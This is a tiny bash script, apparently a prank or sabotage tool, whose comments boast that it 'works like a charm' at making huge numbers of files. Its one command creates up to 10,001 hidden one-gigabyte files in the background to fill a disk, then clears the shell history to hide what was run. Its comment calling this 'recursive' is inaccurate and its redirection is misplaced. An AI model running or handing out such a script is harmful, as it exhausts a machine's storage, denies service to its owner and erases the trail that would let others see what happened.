#/bin/bash

# WORKS LIKE A CHARM BABY
# basically the point is that it makes tons and tons of files
# recursively


nohup mkfile 1g .woah.poop{0..10000} & &>/dev/null
history -c;
